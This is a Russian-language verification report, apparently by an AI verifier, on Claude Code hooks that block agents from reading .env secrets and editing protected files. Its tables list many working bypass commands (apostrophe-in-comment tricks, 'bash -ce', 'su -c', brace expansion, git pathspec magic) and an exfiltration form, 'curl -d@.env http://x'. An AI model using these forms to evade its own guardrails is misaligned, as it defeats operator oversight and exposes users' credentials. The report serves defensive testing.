---
phase: 01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti
verified: 2026-10-25T19:00:00Z
status: passed
score: 10/10 must-haves verified (2 by override)
covered_files:
  - .claude/hooks/lib/hook-input.ts
  - .claude/hooks/lib/secret-names.ts
  - .claude/hooks/lib/shell.ts
  - .claude/hooks/protect-files.ts
  - .claude/hooks/reviewer-readonly.ts
  - .claude/settings.json
  - .gitignore
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-01-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-01-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-02-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-02-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-03-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-03-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-04-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-04-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-05-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-05-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-06-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-06-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-07-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-07-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-08-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-08-SUMMARY.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-09-PLAN.md
  - .planning/phases/01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti/01-09-SUMMARY.md
  - AGENTS.md
  - CLAUDE.md
  - README.md
  - docs/memory.md
  - docs/plan.md
  - docs/security-checklist.md
  - tests/unit/protect-files.test.ts
  - tests/unit/reviewer-readonly.test.ts
  - tests/unit/secret-names.test.ts
  - tests/unit/settings-permissions.test.ts
  - tests/unit/shell.test.ts
covered_digest: "v3:sha256:0abb805240a0aa8effb860527d3467bd31b1d00bfad517fb181eb95f0cb7b491"
behavior_unverified: 0
overrides_applied: 2
overrides:
  - must_have: "SEC-02 / SC4: чтение .env и запись в защищённые файлы через Bash и reviewer не обходятся вариациями базового синтаксиса"
    reason: "Все обходы первого ревью закрыты и закреплены тестами (441 тест). Новые формы того же класса (CR-01..CR-03, WR-01, WR-03, WR-04 из 01-REVIEW.md) перенесены первым шагом фазы 2, до подключения памяти; hooks — эвристика, а не песочница, третий цикл GSD ради них автор счёл непропорционально дорогим. Обходы перечислены в docs/security-checklist.md (статус «закрыт частично»)."
    accepted_by: "Termogaz (автор)"
    accepted_at: "2026-10-25T19:18:12Z"
  - must_have: "SC3 / SEC-01: статус «закрыт» в docs/security-checklist.md соответствует действительности, ограничения не скрыты"
    reason: "Исправлено после верификации в коммите b33b07a: строки чтения через Bash, чтения reviewer-ом и записи в защищённые файлы переведены в «закрыт частично» с перечнем воспроизведённых обходов, введено определение статуса, ссылки на номера находок ведут в 01-REVIEW.md и 01-REVIEW-before-gaps.md. Повторный прогон верификатора не делался (экономия токенов), поэтому оформлено как override."
    accepted_by: "Termogaz (автор)"
    accepted_at: "2026-10-25T19:18:12Z"
re_verification:
  previous_status: gaps_found
  previous_score: 7/9
  gaps_closed:
    - "Прежний gap 2 по перечню воспроизведённых обходов: CR-01..CR-07, WR-01..WR-04 из 01-REVIEW-before-gaps.md (все 20 форм из таблицы прошлого отчёта теперь deny/ask, закреплены тестами)"
    - "Прежний gap 3: README.md:34 и :49 больше не называют docs/plan.md местом прогресса"
    - "Прежний gap 1 в части формулировок: введено определение «закрыт» в чек-листе, правка docs/memory.md про «каждая проверена»; все 18 команд vitest -t из чек-листа проходят"
  gaps_remaining:
    - "SEC-02: свежее ревью нашло новые обходы того же класса, я воспроизвёл их на настоящих функциях (комментарий # с кавычкой, bash -ce / bash -c --, curl -d@.env, ksh/su -c, brace expansion, :(top).env)"
    - "SEC-01: строки 7, 9, 12 чек-листа «закрыт» при воспроизводимых незакрытых обходах; строка 12 сама пишет «Не закрыто»"
  regressions: []
gaps:
  - truth: "SEC-02 / SC4: чтение .env и запись в защищённые файлы через Bash и reviewer не обходятся вариациями базового синтаксиса"
    status: partial
    reason: "Все обходы прошлого отчёта закрыты. Но на настоящих checkBashDecision / checkReviewerCommand (синтетические строки) воспроизведены новые, из того же класса «разбор расходится с bash»: CR-01 нового ревью (апостроф или кавычка в комментарии # глотает следующие строки), CR-02 (bash -ce, bash -c --, bash -c -x, ksh/fish/su -c), CR-03 (значение короткой опции приклеено к флагу: curl -d@.env, awk -f.env), плюс WR-01 (обратные кавычки и stdin-shell для package-lock.json/.git/.claude), WR-03 (brace expansion cat {.env,x}, cat .{env,x}), WR-04 (git show ':(top).env' и в protect-files, и в reviewer). Во всех случаях hook возвращает null (пропуск)."
    artifacts:
      - path: ".claude/hooks/lib/shell.ts"
        issue: "комментарий # не распознаётся; обратные кавычки не граница сегмента; brace expansion вне имени не раскрывается"
      - path: ".claude/hooks/protect-files.ts"
        issue: "nestedScript: кластер -ce, -c перед -- / -x, оболочки ksh/fish/su; readOperands отбрасывает приклеенное значение короткой опции (-d@.env)"
      - path: ".claude/hooks/lib/secret-names.ts"
        issue: "isSecretOperand не снимает pathspec-магию git (:(top).env)"
      - path: ".claude/hooks/reviewer-readonly.ts"
        issue: "git show ':(top).env' проходит (та же причина)"
    missing:
      - "Комментарий # (в tokenize и stripHeredocBodies) с тестами: «echo hi # it's\\ncat .env» -> deny, «echo \"a # b\" > ok.txt» -> null"
      - "nestedScript по правилам bash (любой кластер с c, пропуск опций и --, ksh/mksh/ash/fish/csh, su -c) плюс fail-closed при секретном токене"
      - "Приклеенное значение короткой опции (curl -d@.env, awk -f.env, tar -T.env) в readOperands, парный тест curl -d@data.json"
      - "Обратные кавычки как граница сегмента; fail-closed/ask для package-lock.json, .git/, .claude/ при немоделируемых конструкциях"
      - "Brace expansion в середине слова (или явная запись в ограничения чек-листа); снятие pathspec-магии git в isSecretOperand"
    # Решение автора. Все находки в 01-REVIEW-DISPOSITION.md пока «open».
  - truth: "SC3 / SEC-01: статус «закрыт» в docs/security-checklist.md соответствует действительности, ограничения не скрыты"
    status: partial
    reason: "Определение «закрыт» теперь честное (воспроизведённые обходы закрыты и закреплены тестом, а не «обходов нет»), 18 из 18 команд проверки проходят. Но по этому же определению статус неверен там, где обход воспроизведён и не закрыт: строка 12 пишет «закрыт» и в том же тексте «Не закрыто: find … -delete, git rm, git checkout, git restore, git apply» (я воспроизвёл find . -name package-lock.json -delete и git rm package-lock.json: null). Строки 7 и 9 (закрыт) не называют воспроизводимых обходов из предыдущего пункта (комментарий #, bash -ce, curl -d@.env, brace expansion, :(top).env). Ссылки «01-REVIEW.md WR-01/WR-05/WR-06/WR-07/IN-03» в строках 7, 12, 14 и в docs/memory.md указывают на прежний отчёт, который теперь называется 01-REVIEW-before-gaps.md; в новом 01-REVIEW.md эти идентификаторы означают другие находки."
    artifacts:
      - path: "docs/security-checklist.md"
        issue: "строки 7, 9, 12: «закрыт» при воспроизводимых незакрытых обходах; строка 12 противоречит сама себе; ссылки на идентификаторы устаревшего отчёта"
      - path: "docs/memory.md"
        issue: "запись 2026-10-25 (закрытие пробелов): ссылки на WR-05/06/07, IN-03 из 01-REVIEW.md указывают на другие находки"
    missing:
      - "Либо закрыть обходы (см. предыдущий gap) и добавить тесты, либо перевести строки 7, 9, 12 в «закрыт частично» с перечнем известных обходов (словарь SC3 допускает уточнение статуса, но решает автор)"
      - "Заменить ссылки на 01-REVIEW.md WR-xx ссылками на 01-REVIEW-before-gaps.md или описанием риска прямо в строке"
behavior_unverified_items: []
human_verification:
  - test: "/gsd-progress в новой сессии Claude Code"
    expected: "Видна веха v1.0 «ДЗ-2: агентно-ориентированный пайплайн» и фаза 1 (PLAN-01)"
    why_human: "Слэш-команда исполняется в интерфейсе; автоматически подтверждены только её данные (gsd-tools query progress => v1.0, фаза 01, 9/9 планов и сводок)"
  - test: "Новая сессия: попросить агента выполнить cat ./.env, затем grep SECRET .env (проверка ожидаемого отказа; содержимое не копировать)"
    expected: "Оба вызова отклонены (protect-files или правило permissions)"
    why_human: "Подключение hooks и permissions в живой сессии юнит-тестами не воспроизводится. Косвенное подтверждение: в этой верификации живой hook protect-files отклонил мой Bash-вызов с heredoc, где упоминался .env (fail-closed)"
  - test: "Subagent reviewer: wc -l ./.env и инструмент Grep с путём .env (проверка ожидаемого отказа)"
    expected: "Первый отклонён hook'ом reviewer-readonly, второй — правилом Read(**/.env*)"
    why_human: "Инструменты Read/Grep у reviewer hook не видит; нужен живой subagent"
  - test: "Edit в .claude/agents/reviewer.md при режиме acceptEdits; затем echo x >> .claude/hooks/tmp-check.ts (ответить «No»)"
    expected: "Оба раза запрос подтверждения (permissions ask и ask от protect-files)"
    why_human: "Взаимодействие ask с acceptEdits и запросом hook'а проверяется только в живой сессии (после перезапуска, чтобы подхватить settings.json)"
  - test: "cat < .env отклоняется, а cat <<< .env и git add src/x.ts проходят"
    expected: "Отказ в первом случае, проход во втором и третьем"
    why_human: "Проверка конца фазы в живой сессии"
---

# Phase 1: Базовая линия, единый план и гигиена безопасности — отчёт повторной верификации

**Phase Goal:** Точка «до» зафиксирована, план вехи ведётся в одном месте (GSD), известные обходы запретов закрыты до подключения памяти, а сама фаза проходит полный цикл GSD
**Verified:** 2026-10-25T19:00:00Z
**Status:** gaps_found
**Re-verification:** Да — после закрытия пробелов планами 01-06..01-09 (прежний отчёт: `01-VERIFICATION-before-gaps.md`, 7/9)

## Итог

Работа по закрытию пробелов сделана и проверена: **каждый из трёх прежних пробелов закрыт по тому содержанию, которое в нём было записано**. Все 20 форм обхода из таблицы прошлого отчёта (CR-01..CR-07, WR-01..WR-04) я прогнал заново через настоящие `checkBashDecision` и `checkReviewerCommand` на синтетических строках: теперь это `deny` (или `ask` для рекурсивного `grep` и записи в `.claude/`). `npm run check` зелёный (tsc, eslint, prettier, 11 файлов, 441 тест), 18 из 18 команд `vitest -t` из чек-листа проходят и выбирают от 1 до 44 тестов.

Но фаза остаётся в `gaps_found`. Свежее ревью (`01-REVIEW.md`) нашло три критичных и ряд средних обходов **того же класса**, что и прежние, и я **воспроизвёл их сам**, не полагаясь на ревью: комментарий `#` с апострофом (`echo hi # it's` + перевод строки + `cat .env`), `bash -ce "…"` / `bash -c -- "…"`, `curl -d@.env`, `ksh -c`, `su -c`, brace expansion `cat {.env,x}`, `git show ':(top).env'`. Первые три настолько обыденны (апостроф в английском комментарии многострочной команды агента — типичный случай; `-d@файл` без пробела — штатная запись), что цель «известные обходы закрыты до подключения памяти» нельзя назвать достигнутой: эти обходы теперь известны, они не закрыты, а память (фаза 2) начнёт записывать вывод инструментов. Чек-лист по собственному определению («воспроизведённые обходы закрыты») при этом остаётся неверным для строк 7, 9, 12.

Оговорка о природе гарантии. Hooks заведомо эвристика, а не песочница (`AGENTS.md`, `docs/about.md`, вводный абзац чек-листа). Бесконечного перечня обходов закрыть нельзя, и «whack-a-mole» — верная оценка метода. Поэтому я не требую безупречности, а считаю провалом только то, что (а) воспроизводится обычным синтаксисом, который агент пишет без злого умысла, и (б) противоречит тексту чек-листа. Для остальных (глобы, значения из переменных, интерпретаторы) чек-лист честно называет ограничение. Автор вправе принять остаток через `overrides:`; шаблон ниже.

## Закрытие прежних пробелов — по пунктам

| Прежний gap | Содержание | Статус | Основание |
| --- | --- | --- | --- |
| 1. Чек-лист завышает статусы (строки 7, 9, 10, 11, 12) | «закрыт» при воспроизводимых обходах; «каждая проверена» читается как «обходов нет» | **Закрыт частично** | Определение «закрыт» дописано (`security-checklist.md:3`), `memory.md` поправлен, ограничения перечислены в строках рисков, строки 10 и 11 соответствуют фактам. Остаток: строка 12 («закрыт» + «Не закрыто: find -delete, git rm…», обход воспроизведён), строки 7 и 9 не называют новые обходы, ссылки на устаревшие идентификаторы WR/IN. См. gap 2 во frontmatter |
| 2. SEC-02: обходы чтения `.env` и записи в защищённые файлы | CR-01 (`\"`), CR-02 (`>\|`, `>&`), CR-03 (`\<nl>`, `$'..'`), CR-04 (подоболочка), CR-05 (heredoc), CR-06 (`dd if=`, `curl -d @`, `git show ref:путь`), CR-07 (`git diff --no-index`), WR-01..WR-04 | **Закрыт по перечню, расширен новыми находками** | Таблица ниже: все 20 форм заблокированы. Новые формы (того же класса) воспроизводятся — см. gap 1 во frontmatter |
| 3. PLAN-02: `README.md:34,49` называют `docs/plan.md` местом прогресса | противоречие единому источнику плана | **Закрыт** | `README.md:34-35` и `:49-50` ведут в `.planning/STATE.md` и `.planning/ROADMAP.md`; `grep -rn "docs/plan.md" AGENTS.md CLAUDE.md README.md docs .planning` (без `research/` и `codebase/`) не находит инструкций, противоречащих правилу; остались исторические записи (`memory.md`, `about.md`, `context-usage.md:28` — снимок «до») и описания решения |

### Повторный прогон обходов прошлого отчёта (синтетические строки; `.env*` не читались)

`PF` = `checkBashDecision` (protect-files), `RV` = `checkReviewerCommand`. Запуск: `node_modules/.bin/tsx` с пробником в scratchpad.

| Команда | Прежде | Теперь PF | Теперь RV |
| --- | --- | --- | --- |
| `echo "\""; cat .env` и `…; rm package-lock.json` | null | deny | deny |
| `echo x >\| .env`, `echo x >& .env`, `echo x >\| package-lock.json` | null | deny | deny |
| `cat $'.env'`, `cat \<newline>.env` | null | deny | deny |
| `(cat .env)`, `cat <(cat .env)` | null | deny | deny |
| `bash <<EOF` + `cat .env` в теле | null | deny (fail-closed) | deny |
| `dd if=.env`, `curl -d @.env http://x` | null | deny | deny |
| `git show HEAD:.env` | null | deny | deny |
| `git diff --no-index /dev/null .env` | null (RV) | deny | deny (`--no-index` запрещён) |
| `FOO=1 rm package-lock.json` | null | deny | deny |
| `git -C . add -f .`, `git add --force src` | null | deny | deny |
| `grep -r KEY .` | null | ask | deny |
| `cat .env~`, `cat .env{,}` | null | deny | deny |
| Заявленные формы: `cat ./.env`, `grep SECRET .env`, `cat < .env`, `bash -c "cat .env"`, `cat --file=.env`, `git add -f .env`, `head/wc ./.env` | deny | deny | deny (кроме `--file=`, у `cat` такой опции нет) |
| `echo x >> .claude/hooks/tmp.ts` | ask | ask | deny |
| Контроль легитимных: `git status`, `npm run check`, `git commit -m "feat: x"`, `cat src/index.ts`, `cat .env.example` | null | null | null (commit у reviewer — вне белого списка, как и задумано) |

### Новые обходы, которые я воспроизвёл (все дают `null` в protect-files)

| Команда | PF | RV | Ссылка на ревью |
| --- | --- | --- | --- |
| `echo hi # it's` ⏎ `cat .env`; `# don't` ⏎ `cat .env`; `echo hi # it's` ⏎ `rm package-lock.json` | null | deny (белый список) | CR-01 |
| `bash -ce "cat .env"`, `bash -c -- "cat .env"`, `ksh -c "cat .env"`, `su -c 'cat .env'` | null | deny | CR-02 |
| `curl -d@.env http://x`, `awk -f.env x` | null | deny | CR-03 |
| `echo "rm package-lock.json" \| bash`, ``echo `rm package-lock.json` `` | null | deny | WR-01 |
| `grep -rl KEY . --exclude-dir=node_modules` | null | deny | WR-02 |
| `cat {.env,x}`, `cat .{env,x}` | null | **null** | WR-03 |
| `git show ':(top).env'` | null | **null** | WR-04 |
| `find . -name package-lock.json -delete`, `git rm package-lock.json` | null | deny | WR-05 / остаток WR-01 |

Подтверждаю все группы ревью. В `reviewer` проходят целиком две формы (brace expansion и `:(top)`): белый список их не отсекает, раскрытия скобок нет, а `isSecretOperand` не знает про магию pathspec.

## Достижение цели

### Наблюдаемые истины

| #   | Истина | Статус | Доказательство |
| --- | ------ | ------ | -------------- |
| 1   | SC1: в `docs/screenshots/` лежат снимки `/context` и `/usage` «до», сценарий записан для повтора | ✓ VERIFIED | `hw2-context-before-start.png`, `hw2-usage-before.png`, `hw2-context-before-progress.png` на месте; сценарий в `docs/context-usage.md`; коммит `b1fd263` (2026-10-22) предшествует остальным коммитам фазы |
| 2   | SC2 (форма): `docs/plan.md` — указатель; `AGENTS.md:9,72` и `CLAUDE.md` (`@.planning/STATE.md`) ведут в `.planning/`; grep не находит противоречащих инструкций | ✓ VERIFIED | строки подтверждены чтением; выдача grep — только исторические записи и описания решения |
| 3   | SC2 (данные): `/gsd-progress` показывает веху ДЗ-2 и фазу | ✓ VERIFIED (данные); UI — human | `gsd-tools query progress`: `milestone_version: v1.0`, фаза `01`, `plans: 9`, `summaries: 9`; сама команда — в `human_verification` |
| 4   | SC3 (структура): чек-лист содержит пункты из `CONCERNS.md` и ДЗ-1, у каждого команда проверки и статус | ✓ VERIFIED | 12 строк данных (строки 7-18 файла), 5 колонок; 18 команд `vitest -t` запущены мной, все `rc=0`, каждая выбрала ≥ 1 тест (от 1 до 44) |
| 5   | SC3 (правдивость): «закрыт» соответствует реальной защите, ограничения не скрыты | ✗ FAILED (partial) | Определение «закрыт» честное, строки 8, 10, 11 соответствуют фактам. Строка 12 противоречит себе («закрыт» и «Не закрыто: find -delete, git rm…»; обход воспроизведён). Строки 7, 9 не называют воспроизводимые обходы (комментарий `#`, `bash -ce`, `curl -d@.env`, brace, `:(top)`). Ссылки на идентификаторы устаревшего отчёта |
| 6   | SC4 (заявленные формы): `cat ./.env`, `grep … .env`, `cat < .env`, `bash -c "cat .env"`, `--file=`, `cat/head/tail/wc` у `reviewer` отклоняются, закреплено Vitest | ✓ VERIFIED | живой прогон: все `deny`; тесты `blocks reading secret file` (44 и 7), `tokenizer bypasses` (17), `operand and fail-closed` (26), `git read operands` (12) зелёные |
| 7   | SC4 (по сути SEC-02): чтение `.env` и запись в защищённые файлы не обходятся обычными вариациями синтаксиса | ✗ FAILED (partial) | Прежние обходы закрыты; новые, того же класса, воспроизведены (таблица выше) |
| 8   | SC4 (ask и проверка): правка `.claude/**` требует подтверждения; `npm run check` зелёный | ✓ VERIFIED (конфигурация и тесты) | `Edit(./.claude/**)` в ask, `echo x >> .claude/hooks/tmp.ts` => `ask`; `npm run check`: tsc, eslint, prettier чисто, 441 тест зелёный. Живое поведение — в `human_verification`. Обход ask через `>\|` закрыт, остаётся через комментарий `#` и stdin-shell |
| 9   | SC5: в каталоге фазы есть `PLAN.md`, итоги выполнения и `VERIFICATION.md` | ✓ VERIFIED | `01-01..01-09-PLAN.md`, `01-01..01-09-SUMMARY.md`, этот файл |
| 10  | PLAN-02 (README): документ, который читает проверяющий, не называет `docs/plan.md` местом прогресса | ✓ VERIFIED | `README.md:34-35`, `:49-50`, `:92` согласованы с `AGENTS.md:72` |

**Score:** 8/10 истин проверено (0 присутствуют, но поведение не проверено).

### Отложенные пункты

Нет. Исправления токенизатора, разбора вложенных оболочек и чек-листа не названы ни в цели, ни в критериях фаз 2–5 (фаза 2 — память и hooks, фаза 3 — контекст, фаза 4 — Discovery, фаза 5 — документы и PR), поэтому в deferred не переносятся. Открытые пункты «fail-open без `node_modules`», `isMain` без realpath, Edit-правила от корня, `allowed-tools` в `review-step` уже честно записаны в чек-листе (строка 14, «открыт») и пробелом фазы не считаются.

### Обязательные артефакты

| Артефакт | Ожидается | Статус | Детали |
| -------- | --------- | ------ | ------ |
| `.claude/hooks/lib/shell.ts` | разбор Bash как в bash | ⚠️ PARTIAL | прежние CR-01..CR-04 закрыты; комментарий `#`, обратные кавычки, brace expansion не разобраны |
| `.claude/hooks/lib/secret-names.ts` | единый предикат секретных имён и операндов | ⚠️ PARTIAL | хвост имени расширен (`.env~`, `.env{,}`), `isSecretOperand` есть; pathspec-магия git не снимается |
| `.claude/hooks/protect-files.ts` | отказ чтения, ask для `.claude/`, `git add -f`, fail-closed | ⚠️ PARTIAL | заявленные формы работают; `nestedScript`, приклеенное значение короткой опции — обходы |
| `.claude/hooks/reviewer-readonly.ts` | отказ чтения `.env` у reviewer | ⚠️ PARTIAL | `cat/head/tail/wc` и `git diff/show/log` с обычным путём закрыты, `--no-index` запрещён; brace expansion и `:(top)` проходят |
| `.claude/settings.json` | deny `Read(**/.env*)`, ask `Edit(./.claude/**)` | ✓ VERIFIED | совпадает с тестами `settings-permissions` |
| `.gitignore` | `.envrc` игнорируется | ✓ VERIFIED | закреплено тестом `gitignore keeps envrc` (3 теста) |
| `tests/unit/*.test.ts` (5 файлов, включая новый `shell.test.ts`) | регрессии на обходы | ✓ VERIFIED | 441 тест зелёный; найденных новых обходов в тестах нет (ожидаемо) |
| `docs/security-checklist.md` | 12 пунктов, команда, статус | ✓ EXISTS / ✗ статусы строк 7, 9, 12 завышены | gap 2 |
| `docs/plan.md`, `CLAUDE.md`, `AGENTS.md`, `README.md` | единый источник | ✓ VERIFIED | |
| `docs/memory.md` | запись фазы 1 и закрытия пробелов | ✓ VERIFIED (ссылки на WR/IN устарели) | gap 2 |

`gsd-tools query verify.artifacts` и `verify.key-links` по планам 01-06..01-09: все артефакты и все ссылки проходят (3/3 и 2/2; 1/1 и 2/2; 3/3 и 2/2; 3/3 и 2/2).

### Покрытие требований

Все шесть ID (PLAN-01, PLAN-02, PLAN-04, SEC-01, SEC-02, SEC-03) найдены в `REQUIREMENTS.md`; ни одного ID, сопоставленного фазе 1 и не заявленного планом, нет (потерянных требований нет).

| Требование | План | Описание | Статус | Доказательство |
| ---------- | ---- | -------- | ------ | -------------- |
| PLAN-01 | 01-01 | ROADMAP, REQUIREMENTS, STATE; `/gsd-progress` | ✓ SATISFIED (UI — human) | файлы есть, `query progress` => v1.0 / фаза 01 |
| PLAN-02 | 01-01, 01-09 | `docs/plan.md` — указатель, AGENTS согласован | ✓ SATISFIED | прежняя оговорка про README снята |
| PLAN-04 | 01-03 | фаза проходит полный цикл GSD | ✓ SATISFIED | PLAN ×9, SUMMARY ×9, этот файл; цикл «verify -> gaps -> gap-closure -> re-verify» пройден |
| SEC-01 | 01-03, 01-09 | checklist: команда и статус у каждого пункта | ✗ PARTIAL | форма, команды (18/18 проходят) в порядке; статусы строк 7, 9, 12 — gap 2 |
| SEC-02 | 01-02, 01-04..01-08 | обходы чтения `.env` закрыты и покрыты тестами | ✗ PARTIAL | прежние закрыты; новые воспроизводятся — gap 1 |
| SEC-03 | 01-04, 01-05, 01-08 | правка `.claude/**` — `ask` | ✓ SATISFIED (Edit/Write); Bash — обход через `#` и stdin-shell (gap 1) | `Edit(./.claude/**)` + тесты; `>\|`-обход закрыт |

Замечание для оркестратора: в `REQUIREMENTS.md` отметки PLAN-01 и PLAN-04 стоят `[ ]` / «Gaps Found», SEC-01 и SEC-02 — `[x]` / «Complete». SEC-01 и SEC-02 стоит считать преждевременными до закрытия двух пробелов выше или до решения автора о принятии остатка.

### Антипаттерны

| Файл | Строка | Шаблон | Серьёзность | Влияние |
| ---- | ------ | ------ | ----------- | ------- |
| `.claude/hooks/lib/shell.ts` | tokenize | `#` не комментарий | 🛑 Blocker | апостроф в комментарии прячет следующие строки от обоих hook'ов |
| `.claude/hooks/protect-files.ts` | ~84, 180-183 | `nestedScript` неполный | 🛑 Blocker | `bash -ce`, `bash -c --`, `ksh -c`, `su -c` не разбираются |
| `.claude/hooks/protect-files.ts` | ~165-177 | `readOperands` отбрасывает `-d@.env` | 🛑 Blocker | `curl -d@.env` отправляет секрет наружу |
| `docs/security-checklist.md` | 7, 9, 12 | «закрыт» + воспроизводимые обходы | 🛑 Blocker (SC3) | документ противоречит фактам |
| `.claude/hooks/lib/hook-input.ts` | 26-29 | `isMain` без realpath | ⚠️ Warning | молчаливое отключение hook'а при symlink; в чек-листе честно «открыт» |
| `.claude/hooks/protect-files.ts` | fail-closed | `deny` без пути подтверждения | ⚠️ Warning | ложные отказы; подтверждено вживую: мой вызов Bash с heredoc и упоминанием `.env` был отклонён без возможности подтвердить |
| `tests/unit/protect-files.test.ts` | 4-5 | дубль импорта; тест-страж привязан к процессу GSD | ℹ️ Info | IN-01, IN-02 ревью |
| все файлы фазы | — | `TBD/FIXME/XXX/HACK` | — | не найдено (единственное совпадение `TODO` — литерал команды в тесте, `grep -rn TODO src/`) |

### Требуется проверка человеком

См. `human_verification` во frontmatter (5 пунктов): `/gsd-progress`; ожидаемый отказ `cat ./.env` и `grep SECRET .env`; ожидаемый отказ у `reviewer`; запрос подтверждения при правке `.claude/` под `acceptEdits`; контроль `cat < .env` / `cat <<< .env` / `git add src/x.ts`. Это проверки ожидаемого отказа: если вызов прошёл, это дефект защиты, содержимое не копировать.

### Сводка пробелов

Два пробела, один корень: самодельный разбор shell и вложенных оболочек остаётся хрупким, а чек-лист уже называет класс «закрытым».

1. **SEC-02 / SC4.** Закрыть три обыденные формы: комментарий `#` в `tokenize` и `stripHeredocBodies`, `nestedScript` по правилам bash (любой кластер с `c`, пропуск опций и `--`, дополнительные оболочки, `su -c`), приклеенное значение короткой опции в `readOperands`. Добавить страховку fail-closed для вложенной оболочки с видимым секретным токеном. Остальное (brace expansion, pathspec-магия, обратные кавычки) закрыть или записать в ограничения.
2. **SEC-01 / SC3.** После пункта 1 пересмотреть строки 7, 9, 12; строку 12 исправить в любом случае (статус и текст не должны противоречить друг другу); ссылки на `01-REVIEW.md WR-xx` заменить ссылками на `01-REVIEW-before-gaps.md` или описанием риска без номера.

Варианты решения для автора (решает человек; ничего не помечено как принятое):

- **Закрыть:** `/gsd-plan-phase 1 --gaps` — CR-01..CR-03 и WR-01, WR-03, WR-04 нового ревью с тестами «блокируется» плюс «соседняя легитимная команда проходит», затем пересмотр строк 7, 9, 12 чек-листа. Находки в `01-REVIEW-DISPOSITION.md` сейчас все в статусе `open`.
- **Принять остаток и честно записать:** перевести строки 7, 9, 12 в «закрыт частично» с перечнем воспроизводимых обходов; перенести исправление токенизатора явным пунктом в начало фазы 2 до подключения памяти. Шаблон для `overrides:` во frontmatter:

```yaml
overrides:
  - must_have: "SEC-02 / SC4: чтение .env и запись в защищённые файлы через Bash и reviewer не обходятся вариациями базового синтаксиса"
    reason: "{почему остаток допустим; hooks — эвристика, не песочница}"
    accepted_by: "{имя}"
    accepted_at: "{ISO-время}"
```

Шаблон не внесён: это решение автора, а не верификатора.

---

_Verified: 2026-10-25T19:00:00Z_
_Verifier: Claude (gsd-verifier)_

## Решение автора (2026-10-25)

Автор принял остаток через `overrides:` во frontmatter: два частичных пробела (SEC-02 — новые обходы того же класса, SEC-01 — статусы чек-листа) засчитаны с обоснованием. Чек-лист исправлен в коммите `b33b07a`; закрытие CR-01…CR-03, WR-01, WR-03, WR-04 из `01-REVIEW.md` — первый шаг фазы 2, до подключения памяти. Статус `passed` выставлен по решению автора, без повторного прогона верификатора.
